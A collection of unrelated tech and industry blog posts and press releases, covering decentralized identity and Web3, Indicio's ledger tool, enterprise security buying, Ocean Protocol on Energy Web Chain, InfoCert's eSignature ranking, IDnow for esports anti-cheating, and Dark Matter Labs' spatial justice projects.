the form of applications built on blockchain. These allow users to maintain autonomous control over their private data. They can then decide if and when to share it by granting access through private&nbsp;keys.</p><p>In the next phase of internet development and communication, decentralized metaverses, spaces where virtual worlds (such as games and forums) and the real world collide, are also becoming a reality. Different games will be linked up to each other, as well as to other virtual arenas like online shops or virtual <a href="https://beincrypto.com/learn/top-blockchain-cryptocurrency-events-2020/">events</a> platforms.</p><p>To ensure the seamless integration of these worlds, users have to be able to move between different parts of the metaverse with a consistent identity. All while ensuring their data and privacy is respected.</p><p>Decentralized identity solutions can allow users to create one decentralized username and password. This then allows them to access multiple different platforms securely. Therefore, making them a perfect solution in an integrated decentralized metaverse world.</p> Priorities in&nbsp;Web3 <p>Every blockchain or layer two network must wrestle with tradeoffs such as speed or block size. A given developer’s goals influences these decisions.</p><p>As such, priorities for the ecosystem will have to be set when developing a blockchain for Web3. Open, trustless, decentralized networks that value privacy and security should be prioritized. The principle of interoperability is part of this too. Creating one blockchain to facilitate all users’ needs goes against the decentralized principles that underlie blockchain technology.</p><p>There will be many blockchains and layer two protocols coexisting and providing different services. The task is to ensure that they can communicate seamlessly with one another. Thus, creating a safe and secure Web3 that places users’ needs ahead of those of corporations.</p> Want more Ontology? <p>Learn more about our decentralized data and identity solutions on our <a href="https://ont.io/">website</a> and official <a href="https://twitter.com/OntologyNetwork">Twitter</a> account.

				  Build your business and customer base fast by simplifying ledger writes with Indicio’s easy-to-use toolkit. Scale products and services in minutes  
			  
				
				
				 <p>SEATTLE — October 08, 2021 — Indicio, the world’s leading provider of decentralized identity development and hosting solutions, today announced the public availability of the <a href="https://indicio.tech/indy_network_transaction_wizard/">I</a><a href="https://indicio.tech/indy_network_transaction_wizard/">ndicio Transaction Endorser Wizard</a>, the newest offering&nbsp; in the company’s&nbsp; range of products for building enterprise-grade Trusted Data Ecosystems. The Indicio Transaction Endorser Wizard takes the guesswork out of putting together the right components for a ledger write which means you can get your customers to go live with their products and services&nbsp; in minutes and not hours or days.</p>
<p>Writing to any Hyperledger Indy-based network can be time consuming and complicated.&nbsp; As more companies turn to trusted data ecosystems and verifiable credential technologies to share information in a secure, privacy-preserving way, IT organizations have to take on the challenge of writing to the ledger for their own products and services—as well as endorsing writes for their customers.</p>
<p>These processes, which involve creating decentralized identifiers (DIDs) and schema combination for Hyperledger Indy networks require a high level of technical skill and coordination. The Indicio Transaction Endorser Wizard solves this problem by making writing to the ledger simpler, quicker, and easier to scale. This helps you get to market quicker, expand your market, and grow your business as an endorser for your customers.</p>
<p>“Writing transactions and orchestrating multiple writes from multiple parties is a new core business activity,” said Heather Dahl, CEO, Indicio. “For decentralized identity to scale, for companies to get to market, we need to make these&nbsp; processes as frictionless as possible. For products and services involving multiple customers that all want to issue verifiable credentials this can mean hundreds of ledger writes to a network. The Transaction Endorser Wizard makes this possible&nbsp; in minutes instead of&nbsp; hours for even the most knowledgeable teams. This is an essential tool for scaling decentralized identity solutions for everyone.”</p>

  <p>by <a href="https://www.kuppingercole.com/team/fisher">Paul Fisher</a></p><p>In today’s business environment, companies have three major challenges – making a profit, finding great people, and staying ahead of the competition. That’s quite enough, but they also have major operational challenges with IT, cyber security, and compliance. For example, IBM Security Services reports that it’s not unusual for clients to have more than 15 different cloud providers – and probably more they don’t know about. How do business and IT leaders deal with that when they don’t even know how many clouds there are, or what data resides on those multiple clouds? They can appoint new people into new privacy and security positions to cope but is that enough? Given the cyber threats the business now faces, it most likely is not.</p>
 Hail to the chief security officer 
<p>Most recently, the number of companies falling victim to ransomware attacks has seen a steep increase. The fear that ransomware and other forms of cyber-attack will have a serious impact on the US economy led to President Biden’s Executive Order on radically improving cyber security within Federal Agencies. This seriously upped the game for those vendors that wish to supply into the Federal Sector, and the rigorous standards they will now have to meet.</p>
<p>The Executive Order is far reaching and will have an impact on the private sector where the cyber threat is no less acute. The order states: “The trust we place in our digital infrastructure should be proportional to how trustworthy and transparent that infrastructure is, and to the consequences we will incur if that trust is misplaced.”&nbsp;This almost perfectly describes the situation that many private companies now find themselves in when looking for partners to improve their own security posture against the worsening threat landscape – trust is all important as is the ability to provide modern scalable security platforms that are compatible with legacy platforms.</p>
 What IT buyers are looking for now, and why 
<p>Buyers are looking for an integrated approach to data security, privacy and governance – and looking for trusted partners to provide such solutions. The major challenge is that IT infrastructures for many organizations are of necessity more complex as they seek to make progress on digital transformation with clouds, infrastructure as code, third party and customer identity management etc. – and this has made a consistent approach to security and governance harder. Too often, incompatible legacy solutions are preventing a fully joined up holistic approach to security and governance and creating pain points across the enterprise. With modality now the order of the day for larger enterprises clients want to see vendors and service providers who understand the customer’s pain points and how they are trying to address it, reaching further into relationships that scale and mature.</p>
 Finding the data and then protecting it is not easy 
<p>Understanding data is central to innovation, efficiency and productivity and therefore its protection is paramount. To make use of data, teams must know where it is. Data on customer behaviour is hugely valuable to defining new services and products but it’s also sensitive and needs protecting. Thales, a global digital identity and security company, advises that encryption is a good solution, but it too must be managed, be best in breed so that it 100% protects data but does not stand in the way of access to those that need it. Encrypted data is useless to hackers, but it is also no good to users if they cannot decrypt what they need with zero latency.</p>
<p>There is of course no silver bullet when it comes to protecting data and applications but for any security infrastructure to succeed following an internationally recognised framework such as NIST is advisable. It helps with purchase decisions, deployment and operation to follow accepted and recognised patterns and will also help with meeting compliance demands. The best IT services providers and integrators will be able to ensure that any security project or data protection platform follows recognised and suitable frameworks that also fit the culture, operations and market obligations of the client.</p>
<p>Clients do not want to rip out legacy technologies to conform to an individual platform – so solutions must have as many integrations as possible – a “perfectly baked cake” that covers the full spectrum of integrations that plays nicely with other applications in the stack. Of course, writing this is simple, doing it is much harder and few organizations these days can achieve security solutions suitably hardened and stressed tested against compliance standards and known vulnerabilities without expert help that understands business.</p>
 Poor security costs more than dollars 
<p>The cost of inadequate or badly configured IT security is not just measured in lost production or through ransomware payments but also in loss of reputation and brand damage after a breach. And, since the emergence of consumer privacy regulations such as the EU GDPR, organizations have had to ensure that they protect PII or be subject to fines. This comes at the same time as enterprises are introducing more consumer focused digital services putting further emphasis on protecting customer data. If that is not secured any new digital relationship with customers (CIAM) will not work – the trust will not be there. In those less regulated markets where Privacy Regulation are less severe this may matter less in dollar terms but a reputation for good security and looking after customer data will do brands no harm at all in any market.</p>
<p>Increasingly businesses should see spend on cybersecurity not as cost but as an investment – in the company, its people and its future. Further, in the joined up interconnected supply chains we are accustomed to – companies increasingly wish to do business with other companies that proactively think about security – and can be seen to tangible taking steps to be as secure as possible.</p>
<p>It is about reputation with customers and partners in supply chain. It is about competitive positioning. For example, legacy financial institutions need to compete with more agile cloud native FinTechs who may have a more baked in security layer. To compete they will demand a security and privacy fabric entwined with their clouds and, importantly, legacy infrastructures – and they will look to trusted IT partners to provide this.</p>

<p>Ocean Protocol smart contracts and Ocean Market are now running on Energy Web Foundation’s dedicated network</p><p>As part of Ocean’s<a href="https://blog.oceanprotocol.com/oceans-on-ethereum-mainnet-ba9be1aee0ce"> multi-chain strategy</a>, we have deployed Ocean’s technology to <a href="https://www.energyweb.org/technology/energy-web-chain">Energy Web Chain</a> (EWC), the dedicated network for <a href="https://www.energyweb.org/">Energy Web </a>(EW). This collaboration marks a major milestone in the energy vertical of the Ocean data ecosystem.</p><p>Energy Web is the leading decentralized energy ecosystem, trusted by influential energy companies including GE, Tepco and national operators the world over. The Energy Web consortium has more than 100 organizations. EW technology enables any energy asset owned by any customer to participate in any energy&nbsp;market.</p><p>The Energy Web Chain (EWC) “is a public, enterprise-grade blockchain platform designed for the energy sector’s regulatory, operational, and market needs. Launched in mid-2019, it has become the industry’s leading choice as the foundational digital infrastructure on which to build and run blockchain-based decentralized applications (dApps)”&nbsp;[<a href="https://www.energyweb.org/technology/energy-web-chain/">link</a>].</p><p>The teams of Ocean and Energy Web have been quietly collaborating since 2017, when both projects were at inception stages. Ocean has contributed to EW’s annual Event Horizon conference, for example with this 2019 talk “Energy Data and Access Management” [<a href="https://www.slideshare.net/TrentMcConaghy/energy-data-access-management-with-ocean-protocol">slides</a>][<a href="https://www.youtube.com/watch?v=lC50EARadwo&amp;feature=youtu.be">video</a>]. Moreover, both Energy Web and Ocean have long-standing collaborations in the Kusama / Polkadot ecosystems. Ocean and Energy Web have grown up together.</p><p>EWC is EVM-compatible, which allows it to run Ethereum smart contracts and use Ethereum-style ERC20 tokens. It’s currently a <a href="https://twitter.com/energywebx/status/1051832833579266049?lang=en">Proof-of-Authority</a> chain with a modern consensus algorithm built on <a href="https://www.parity.io/technologies/substrate/">Parity Substrate</a> technology. This allows it to have low gas fees and low latency compared to Ethereum&nbsp;mainnet.</p>The <a href="https://market.oceanprotocol.com/asset/did:op:96856f1abC947322AcAeC3f3eBAb01Ef29B7E605">first dataset published in&nbsp;EWT</a>.<p>With Ocean deployed to EWC, this&nbsp;means:</p>  Users of<a href="http://market.oceanprotocol.com"> Ocean Market</a> can publish, swap, stake, and consume data assets in&nbsp;EWC.  Data marketplace builders and other dApp developers can use Ocean libraries (ocean.js, ocean.py) and frontend components (<a href="https://github.com/oceanprotocol/market">market</a>) with&nbsp;EWC.  Token holders can move their<a href="https://etherscan.io/token/0x967da4048cd07ab37855c090aaf366e4ce1b9f48"> OCEAN on Ethereum mainnet</a> to OCEAN on EWC, and back using<a href="http://binance.com"> </a>the <a href="https://bridge.energyweb.org">Energy Web Token Bridge</a> or the <a href="https://bridge.carbonswap.exchange/bridge">CarbonSwap OmniBridge</a>.  <p>Ocean components supported in EWC include: Ocean smart contracts, Ocean Market, Provider (for data services), Aquarius (metadata cache), and Ocean Subgraph (The Graph queries). For more details, visit our <a href="https://docs.oceanprotocol.com/concepts/networks/#energy-web-chain">Supported Networks</a>&nbsp;page.</p> Cross-chain Mental&nbsp;Model <p>Ocean is now deployed to five production networks: Ethereum mainnet, <a href="https://blog.oceanprotocol.com/ocean-on-polygon-network-8abad19cbf47">Polygon mainnet (Matic)</a>, <a href="https://blog.oceanprotocol.com/oceans-on-binance-smart-chain-6bfe715a492c">Binance Smart Chain (BSC)</a>, <a href="https://blog.oceanprotocol.com/oceans-on-moonriver-d4f3e26fbc5">Moonriver</a>, and (new) Energy Web&nbsp;Chain.</p><p>An <a href="https://market.oceanprotocol.com">Ocean Market</a> user can click on the network preference in the top right, and toggle which chains they would like to see the assets for. EWC is now in this list and selected by default for all new&nbsp;users.</p>Default selected networks now include Energy Web&nbsp;Chain.<p>In each of these networks, tokens on the network have real value associated, so there need to be token bridges across networks. For EWC this&nbsp;is:</p>  <a href="https://oceanprotocol.com/token">OCEAN</a> on Ethereum mainnet gets bridged across as OCEAN on&nbsp;EWC.  ETH for gas fees on Ethereum mainnet corresponds to <a href="https://www.coingecko.com/en/coins/moonriver">EWT</a> for gas fees on&nbsp;EWC.  EWT is the native token on Moonriver used for gas&nbsp;fees.<p>For dApp developers, as with other networks, in <a href="https://github.com/oceanprotocol/ocean.js">ocean.js</a> the Energy Web Chain chainId is passed to the ConfigHelper to get all required endpoints for initializing Ocean, while in <a href="https://github.com/oceanprotocol/ocean.py">ocean.py</a> the respective RPC URL needs to be set as the <a href="https://github.com/oceanprotocol/ocean.py/blob/main/READMEs/parameters.md">network config parameter</a>.</p> Resources on Ocean *&nbsp;EWC   <a href="https://docs.oceanprotocol.com/concepts/networks/#energy-web-chain">Docs: Ocean-related tokens and services in&nbsp;EWC</a>  <a href="https://explorer.energyweb.org/tokens/0x593122AAE80A6Fc3183b2AC0c4ab3336dEbeE528">OCEAN contract in EWC blockchain explorer</a>  <a href="https://bridge.energyweb.org">Energy Web Token&nbsp;Bridge</a>  <a href="https://bridge.carbonswap.exchange/bridge">CarbonSwap OmniBridge</a>   Announcement Statements <blockquote>With the decentralization of energy assets, energy market participants need your data to operate the markets.

<p>Settembre 2021: InfoCert riconosciuta come Leader a livello mondiale nel mercato dell’eSignature nell’IDC MarketScape: Worldwide eSignature Software 2021 Vendor Assessment (doc #US46742320, September 2021).</p>



<p>Nello studio, che ha preso in considerazione 15 tra i più importanti fornitori di soluzioni di firma elettronica a livello mondiale, in virtù delle proprie capacità e strategie connesse alla propria offerta, InfoCert si posiziona nella “Leaders category”.</p>



<p>Lo studio di IDC esamina vari fornitori di software di firma elettronica in tutto il mondo. Le soluzioni di firma elettronica sono un elemento importante per migliorare sia l’efficienza che l’esperienza dei flussi di lavoro incentrati sui contenuti tra imprese e tra imprese e consumatori.</p>



<p>In un momento storico in cui un numero crescente di documenti “nasce digitale” e le Organizzazioni continuano a digitalizzare i flussi di lavoro incentrati sui contenuti, la firma elettronica ha permesso a questi flussi di lavoro di rimanere digitali e apportare benefici, tra cui la riduzione dei tempi e dei costi delle transazioni, una maggiore sicurezza e una migliore user experience per dipendenti, fornitori, partner e clienti.</p>



<blockquote><p>Il contributo della tecnologia della firma elettronica alla continuità aziendale è diventato lampante durante la pandemia COVID-19. Le carenze sono risultate evidenti nelle Organizzazioni prive di processi aziendali completamente digitalizzati e i lavoratori in remoto hanno dovuto cercare metodi alternativi per portare avanti il lavoro.</p>Holly Muscolino – Research vice president, Content Strategies and the Future of Work</blockquote>



 InfoCert e la sua soluzione di eSignature: GoSign 



<p><a href="https://infocert.digital/it/soluzioni/transazioni-e-flussi-approvativi-digitali/">GoSign</a>, la soluzione di firma di InfoCert, è ormai un punto di riferimento sul mercato grazie alla sua versatilità. La possibilità di firmare su qualsiasi dispositivo, utilizzare diverse tipologie di firma e personalizzare la soluzione con processi verticali, consente alle aziende di velocizzare i processi approvativi e quelli di firma verso clienti e fornitori.</p>



<blockquote><p>Essere posizionati da IDC tra le aziende Leader nell’IDC MarketScape per il mercato delle soluzioni di firma digitale conferma il lavoro straordinario che InfoCert ha fatto in questi anni nel campo del Digital Trust.</p><p>La nostra missione è supportare i nostri clienti con soluzioni end-to-end che li abilitino ad una trasformazione digitale sicura e con un livello di Trust e di Governance scalabile, secondo le esigenze del business. Grazie anche al recente ingresso nel gruppo Tinexta di tre nuove aziende focalizzate nella CyberSecurity, amplieremo ulteriormente il ventaglio della nostra offerta.</p><p>Il nostro obiettivo è quello di essere sempre al passo con le evoluzioni tecnologiche e di scenario normativo che continuamente cambiano il nostro mercato. L’attitudine al miglioramento è sicuramente un tratto distintivo che ci ha permesso di affermarci come riferimento per numerose aziende e professionisti che da anni si affidano ai nostri servizi.</p>Danilo Cattaneo – InfoCert CEO</blockquote>



<p>Sono ben 650 milioni le firme apposte nel 2020 attraverso GoSign, che conta 3,8 milioni di utilizzatori nel mondo, dei quali più di 1 milione e mezzo ogni giorno utilizza la piattaforma per firmare e gestire iter approvativi in digitale.</p>



<p>GoSign è già stata adottata con successo da importanti aziende in vari settori di mercato – tra cui Automotive, Utilities, Healtcare, Insurance e Servizi finanziari – aiutando le Organizzazioni a digitalizzare i servizi di vendita e noleggio, la firma e gestione di approvazioni interne o contratti con clienti e fornitori, riducendo il tempo medio di ogni firma e approvazione​ in modo consistente.</p>



 IL TOTAL ECONOMIC IMPACT di INFOCERT GOSIGN

<p>September 2021: InfoCert has been recognized as a Leader in the eSignature market in the IDC MarketScape: Worldwide eSignature Software 2021 Vendor Assessment (doc #US46742320, September 2021).</p>



<p>The report, evaluated 15 e-signature solution providers on the basis of their capabilities and strategies related to their offerings, InfoCert was placed in the “Leaders Category“.</p>



<p>The IDC MarketScape study examines various esignature software vendors worldwide. eSignature solutions are an important element in improving both the efficiency and the experience surrounding business-to-business and business-to-consumer content-centric workflows.</p>



<p>According to the IDC website, as an increasing number of documents are “born digital” and organizations continue to digitally transform content-centric workflows, esignature technology has enabled those workflows to remain digital and drive benefits including reduction in transaction time and cost, increased security, and improved employee, supplier, partner, and customer experiences.</p>



<blockquote><p>The contribution of esignature technology to business continuity became glaringly evident during the COVID-19 pandemic. Gaps were exposed in organizations without end-to-end digitally transformed business processes, and remote workers had to seek alternative methods to move the process forward.</p>Holly Muscolino – Research vice president, Content Strategies and the Future of Work</blockquote>



 InfoCert and its eSignature Solution: GoSign 



<p><a href="https://infocert.digital/solutions/digital-transaction-and-approval/">GoSign</a>, InfoCert’s eSignature solution, is now a benchmark in the market thanks to its versatility. The ability to sign on any device, use different types of signatures and customize the solution with vertical processes allows companies to speed up approval processes and signature processes with customers and suppliers.</p>



<blockquote><p>Being positioned as a Leader by the IDC MarketScape in the market for digital signature solutions confirms the extraordinary work InfoCert has done in recent years in the field of Digital Trust. </p><p>Our mission is to support our customers with end-to-end solutions that enable them to have a secure digital transformation with a scalable level of Trust and Governance, according to the needs of their business. Thanks also to the recent entry into the Tinexta group of three new companies focused on CyberSecurity, we will further expand the range of our offerings.</p><p>We aim to be always in step with the technological and regulatory scenario evolutions that continuously change our market. The attitude to improvement is certainly a distinctive feature that has allowed us to establish ourselves as a reference for many companies and professionals who for years have relied on our services</p>Danilo Cattaneo – InfoCert CEO</blockquote>



<p>In 2020, 650 million signatures were performed through GoSign, which has 3.8 million users worldwide, of which more than 1.5 million use the platform every day to digitally sign and manage approval processes.</p>



<p>GoSign has already been successfully adopted by leading companies in various market sectors, including Automotive, Utilities, Healtcare, Insurance and Financial Services. GoSign helps these organizations to digitize sales and rental services, sign and manage internal approvals or contracts with customers and suppliers every day, reducing the average time of each signature and approval consistently.</p>



 THE TOTAL ECONOMIC IMPACT of INFOCERT GOSIGN 



<p>An independent study, conducted by Forrester Research, analyzes all of the quantitative and qualitative benefits that a major InfoCert customer in the energy industry was able to achieve by adopting GoSign. These benefits include:</p>

<p>Cheating in esports is a pressing issue as it poses a threat to all involved stakeholders. From players to developers, tournament hosts, and sponsors, if a tournament is damaged by the presence of cheaters, the fallout is never good.&nbsp;</p>
<p>Especially with esports being such a fast paced and modern environment, negative news spreads like wildfire and just one incident could have lasting repercussions, sometimes even to a point of no return.&nbsp;</p>
<p>This is why it’s vital to detect and prevent online gaming fraud and one of the best ways to do this is through the use of AI-powered identity verification systems. But what exactly does this mean and how does it all work? Let’s break it all down step by step.&nbsp;</p>
 What is AI-Powered Identity Verification? 
<p>AI-powered Identity verification is a system that combines the best of human instinct and technology with modern machine learning technology to verify the identity of users. It allows for a streamlined user experience and, with tools like IDnow’s Autoident, it can be as simple as a user uploading images of their ID documents and following on screen prompts.&nbsp;</p>
<p>The biggest advantages of using an AI-powered system are the speed and accuracy of results. It both eliminates time consuming manual inputs, as well as the risk of human error. Overall, it is a both quick and secure method to verify users identification and can be used as both a cheater prevention and age verification tool.&nbsp;</p>
 How could AI-Powered Identity Verification be used for esports? 
<p>There are many ways that an online identification system could be used in <a href="https://www.idnow.io/esports/">esports</a>. It could come as a solution to a key problem of ‘ghost accounts’ – these are new accounts created and used by cheaters when they have been caught and banned on other accounts, allowing them to cheat in a game all over again. This is one of the biggest issues, as there’s currently no real way to stop users from making new accounts and it’s especially problematic in free-to-play games, where there’s no cost to making a new account.</p>
<p>By using an AI-powered identity verification tool, accounts could only be created if they are tied to unique users, which would require official documents and proof of identity, making it much more difficult to make and obtain ghost accounts.&nbsp;</p>
<p>This would also come as a deterrent to cheating and other illicit activities in the first place, as players would be held accountable for their accounts and wouldn’t be able to play the game again if they were banned. As the tools require ID verification, it would also aid in preventing fraud and under-age gaming.&nbsp;</p>
<p>At the same time, it also provides an extra layer of security, as these verification tools can also be used as a multi-factor authentication system.&nbsp;</p>
<p>The best news is that these AI-powered identity verification systems already exist and successfully function in other markets. Let’s take a look at one example, IDnow.&nbsp;</p>
 How IDnow’s Autoident can solve esports’ cheating problem 
<p>IDnow’s Autoident can be the perfect solution to the outlined problems. It’s an AI-powered identity verification tool that makes it quick and painless for users and is thus a perfect fit for the fast paced esports world.&nbsp;</p>
<p>Verification can be as simple as downloading an ID verification app, then scanning an ID document and taking a selfie to confirm identity. This is then automatically verified through AI and users can expect results within minutes, all while following simple on screen instructions. Even if there is an issue, IDnow specialists are always available and still able to deliver speedy results.&nbsp;</p>
<p>The platform also boasts great scalability and potential for global deployment as it’s able to identify people anywhere, anytime. In fact, right now there is potential to cover 7 Billion customers from 195 different countries and considering how much of a global phenomenon gaming and esports is, this will be vital for large scale, triple A titles.&nbsp;</p>
<p>Best of all, IDnow boasts impressive proof of work, having already employed products with over 250 customers, including leading international companies like Lottoland, Bank of Scotland, and Western Union during their seven years in business.&nbsp;</p>
<p>All this means that IDnow’s Autoident not only fills the gaps in esports current anti-cheater systems, but also has a reliable and experienced team that can provably deliver an exceptional product and service.</p>

 DM Note #6 — Building the Spatial Justice&nbsp;Mission <p>This is the sixth in a series of<a href="https://provocations.darkmatterlabs.org/"> DM notes</a>, in which we write about insights from our work on the ground, following internal learning sessions called DM Downloads that are organized every two weeks or so. The aim is to make our practice more legible, for us as well as for&nbsp;you.</p><p>As some of you might know, Dark Matter Labs emerged from the interest of revealing and transforming the forces dictating our built environment. The Spatial Justice mission formalises this intention that still drives us: understanding institutional innovation, systemic challenges, and social justice through built form and lived spaces. In partnership with communities and governments around the world, we aim at developing the open systems for tech enabled, democratic and sustainable urban&nbsp;futures.</p> Why Spatial&nbsp;Justice? <p>Spatial justice is not a new term. It references an established body of academic work and activism that frames social justice not just as concerned with distribution of wealth and power amongst individuals or groups, but one that shaped and driven by the geography and place in which it takes place. How we organise and experience space can lock in injustice and ecological degradation, or can accelerate equity and agency, a good economic recovery and support climate transition.</p><p>One of the first steps in understanding this area of work is to delineate a set series of scales of spatial justice: from the discreet materials that make up our buildings, through to scales that are in themselves complex systems, like cities or bio-regions.</p><p>Over the past few years and across many initiatives and geographies, we have been working on building a mission around spatial justice that recognizes that the intimate spaces of our homes and the community spaces of our neighbourhoods have become the minimum viable units for systemic&nbsp;change.</p><p>The second step is to focus heavily on the invisible layers of design that shape those physical scales; centring heavily on contemporary bureaucracy, financial incentives, and governance structures (eg. planning policy, urban use licenses, property laws, etc.) — and investigating these as active sites for creating spatial&nbsp;justice.</p> Focus areas: <p>Out of this framing we have landed on four focus areas of work, and seek projects, initiatives, and willing partners for advancing this:</p><p>Socializing the value of&nbsp;land</p>  Equity in access and affordability  Civic ownership &amp; governance  Linking land value to civic and social infrastructure  Linking land value to civic outcomes (eg. air&nbsp;quality)  <p>Locally-led Just Climate Transition</p>  Building community capacity, collective ownership and resilience  Developing models that support additional long-term investment  Changing the dynamics of finance and local&nbsp;places  <p>Material circulatory and self sovereignty</p>  Beyond human asset ownership and extraction  Indigenous law and legal sovereignty of materials  National material passports and performance registry  <p>(performance based) Contract innovation</p>  Focus on performance rather than&nbsp;objects  Live energy use intensity contracts   Projects <p>Supporting greater equality and transitioning our urban economies beyond carbon will require unprecedented levels of intervention and investment, and in turn, a new model of democratic and collective ownership and management. The following projects, being developed across North America and Europe each explore various possibilities on how to rethink our relationship to the land and how we use&nbsp;it.</p> Smart Covenant / Smart&nbsp;Commons Real estate value impact of New York’s&nbsp;Highline<p>Public investment in shared infrastructure results in disproportionate private profit through land value uplift. This problem which underpins our current model of urban development, fuelling land speculation and creating unequal and unsustainable neighbourhoods. We need to find ways to redesign our land&nbsp;economy.</p><p>In collaboration with <a href="https://www.climate-kic.org/">EIT Climate-KIC</a> and <a href="http://spatialtech.info/">Centre for Spatial Technologies</a>, Dark Matter Labs are developing a platform that brings together smart contracts, property value data and distributed ledgers to more fairly distribute this public value, by creating a mechanism to invest in building more sustainable communities.</p><p>Since the <a href="https://provocations.darkmatterlabs.org/a-smart-commons-528f4e53cec2">publication of Smart Commons on Medium</a>, we built on the feedback we received to better understand the technical and cultural barriers in the realization of that vision. We then further adapted these proposals to other areas we are working on to further develop them, such as micro-contracting for the retrofit of buildings.</p><p>Partners: EIT Climate-KIC and Centre for Spatial Technologies</p> Open Whole Community Retrofit Ecosystem <p>To meet our current climate targets almost every home and neighbourhood in the UK will need to be retrofitted to reduce energy and resource demand, reduce flood risk, urban heat island effects and manage and reduce associated liabilities. This is also a massive opportunity to create better and healthier homes and neighbourhoods as well as a whole new sector of the&nbsp;economy.</p><p>Previous approaches to retrofit have failed dismally. This is often because government has assumed that the best way forward is to create subsidies for individual measures for individual households.</p><p>Furthermore the UK remains a deeply unequal and highly centralized society and current proposals around ‘levelling up’ remain poorly articulated, governed and resourced. More than ten years of austerity have significantly damaged local capacity and resilience.</p><p>This project seeks to use new investment logic (transformation capital), to create positive change and support the tangible and intangible assets in our communities (community capital) by using new forms of contracting and better understanding of spillover value flows (civic value) and changing the dynamics between financial institutions and local places. Rather than an atomized approach, we are exploring how locally accountable climate transition organisations can support collective change, and how this might be replicated.</p><p>Transformation Capital is the deployment of capital to fundamentally change dynamics of the (real-economy) system, setting it on an environmentally and socially sustainable footing, as well enabling the continued multiplication of capital in the long run. This will go way beyond small shifts being currently assumed through ESG investment paradigm.</p><p>When this is aligned with places and communities in a way that, rather extracting their value, generates compound, multiplying value (for both private and public actors) and invests in the networks of trust, deliberation and agency at local level alongside climate transition projects themselves, this marrying of transformation capital and community capital can establish a new model for systemic, non-extractive investment logic.</p><p>Partners: Working with Thirty Percy, Lankelly Chase, EIT-Climate KIC, TransCap Initiative, and Civic Square, the project is currently engaging residents on a street in Birmingham, to help the residents envision potential street-scale propositions, such as street retrofit, and rewiring and integrating their value&nbsp;flows.</p> Healthy, Clean Cities EU&nbsp;CINCO <p><a href="https://www.climate-kic.org/press-releases/eit-climate-kic-and-partners-collaborate-with-laudes-foundation-to-advance-madrid-and-milan-sustainable-urban-approach-across-europe-2/">Healthy, Clean Cities EU CINCO</a> is a two-year initiative, supported by Laudes Foundation, which focusses on accelerating efforts to minimise embodied carbon in new buildings, supporting circular practices and increasing uptake of bio-based materials. Acting in the cities of Madrid and Milan as the two initial testbeds, Dark Matter Labs is working with a consortium of European design partners, coordinated by EIT Climate-KIC, alongside implementation partners who include: City of Madrid, Commune di Milano, AMAT, Redo, Distrito Castellana Norte, Arup, Politecnico di Milano and itdUPM. The testbeds are two of Europe’s largest urban regeneration projects: Madrid Nuevo Norte and Milan’s L’Innesto.</p><p>The consortium is working closely with local partners to identify and develop innovations which could support greenhouse gas neutrality of a development over its full lifecycle, considering opportunities throughout the value chain, including: policy and regulation; financing; citizen engagement; digital tools and data; and materials and processes. Dark Matter Labs is specifically focussing on the areas of policy and regulation, contractual innovation and digital and data infrastructure.</p><p>Partners: Design partners — EIT Climate-KIC, Bankers Without Boundaries, Democratic Society and Material Economics + Implementation partners — City of Madrid, Commune di Milano, AMAT, Redo, Distrito Castellana Norte, Arup, Politecnico di Milano and&nbsp;itdUPM</p> Material Registry / Performance-Based Contracting Mapping the life cycle impacts of an electric hire&nbsp;bicycle<p>Material Registry is a concept for an open registry of embodied impact data and in-use performance data for buildings and their constituent components, that could enable performance-based contracting and regulation in the built environment. If implemented it would enable better decisions on building retrofit, material circularity and minimizing environmental impacts.</p><p>The registry would provide open access to standardized and reliable data on embodied carbon, materials, processes and labour; component condition, location and performance such as air quality, temperature and humidity.</p><p>In collaboration with the Centre for Spatial Technologies, Dark Matter Labs has been developing an animation to illustrate the lifecycle of a self-sovereign window that describes the matter, processes and the embodied impacts it contains as well as the possible futures it could become part&nbsp;of.</p><p>Self-sovereign objects are are self-executing and self-owning; capable of determining their own lifecycle to maximise material utility and performance whilst minimizing negative environmental impacts. Augmented by sensing capabilities and the ability to autonomously execute smart contracts, material objects could continuously monitor their own performance and contract for their maintenance, repair or recycling.</p><p>Partners: Centre for Spatial Technologies, EIT Climate-KIC</p> Community Wealth / Perpetual Affordability <p>In Canada close to 79% of wealth is invested in real estate both directly through home ownership but also through our investments, pension plans and education funds for our children. There is a similar situation in many other countries.</p><p>This leads to our economy, our money and political systems being locked into unsustainable policies and paradigms of ever increasing land values (and the attendant housing affordability crises) and new construction (and the challenges around material use set out above as well as possibly social&nbsp;costs).</p><p>Community Wealth focuses on systematic change in the ways we view wealth and its purpose by transitioning away from a dichotomy of private and public property ownership towards portfolios of community assets, jointly owned and governed. We believe this would better allow us to address the affordability gap that is breaking apart our social fabric, as well as create solutions for climate&nbsp;crisis.</p><p>One of the pathways towards this long-term horizon goal is through creation of a parallel housing market that would focus on the ‘missing middle’ of the Canadian residential real estate market. By aggregating capital at a national level through a fund and deploying it locally to participatory districts, first-time home buyers as well as existing home owners would be able to transition towards a new model of “perpetual stewardship”.</p><p>We are focusing on specific components of the long-term horizon and prototyping the following connected proposals:</p>  “Free House” where smart perpetual bond meets self-sovereign house meets stewardship contract;  “Community wealth portfolio” which consists of: affordable homes (via Free House and other models); Renewable energy; Shared Transportation; Local small businesses (via retail real estate); Natural assets; and Co-sharing working space (via office real&nbsp;estate);  “Smart Perpetual Bond” — long-term instrument for capitalizing the community wealth portfolio;  “Participatory District” — a new type of intermediary that holds all above-land assets; jointly owned and governed by: residents, community foundations, community groups (social enterprises, not for profits working to meet community needs) and government;  “Smart Community Trust” — asset holder of all land in perpetuity.  <p>Partners: United Properties Resource Corporation, CMHC, Watershed Partners, Third Space Planning and Generation Squeeze</p> Key Questions, Lessons and Challenges Moving&nbsp;Forward   Getting to the right mission framing: Spatial Justice encompasses a very broad range of topics. What are we missing or overstepping the line with the framing to better organise internally around the key platform components that we want to build for the just climate transition of the built environment? How do our projects interact?  Understanding real estate as a system: How do we understand ‘real estate’ as a system for spatial justice? How can we address materials (build quality, lifespan, carbon, maintenance), supply chain (labour rights, skill level, regenerative), ownership (power, legal setup, governance), finance (liquidity, value) and data (behaviour, technology, openness) in that&nbsp;system?  Lack of quality information on materials: Currently, we lack of good quality information on buildings. We lack open, verified data on: Supply chain (Materials; Processes; Carbon; Labour practices..), Performance of components (Air tightness; Thermal insulation; Condition; Reuse potential…) and Performance of spaces (Indoor air quality; Temperature; Humidity; Light…). What are the best ways to change&nbsp;that?  Various horizons are important: At least 3 horizons are key to the mission’ advancement; Horizon 1 teaches the sequencing in the pathway, Horizon 2 constructs a macro solution within existing system, and Horizon 3 illustrates the possibility of the mission and creates an alternative system. We needed to advance on all three horizons simultaneously in order to move towards a possibility of the solution.  